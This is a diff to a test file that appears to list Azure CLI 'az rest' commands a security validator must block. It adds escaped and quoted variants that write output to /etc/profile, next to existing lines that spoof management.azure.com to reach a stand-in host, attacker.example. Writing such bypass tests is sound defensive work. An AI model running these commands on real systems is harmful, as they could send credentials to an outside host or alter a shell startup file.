@@ -73,6 +73,8 @@ def test_az_read_only_allowed(client, base_event, command):
         "az rest --method get --url https://management.azure.com.attacker.example/x",
         "az rest --method get --url https://attacker.example/management.azure.com/x",
         "az rest --method get --url https://management.azure.com/x --output-file /etc/profile",
+        "az rest --method get --url https://management.azure.com/x --output-file \\/etc/profile",
+        'az rest --method get --url https://management.azure.com/x --output-file "/etc/profile"',
         'az rest --method get --url "https://attacker.example?.visualstudio.com" --resource https://management.azure.com/',
         "az rest --method get --url https://attacker.example#.visualstudio.com",
         "az rest --method get --url https://management.azure.com@attacker.example/x",
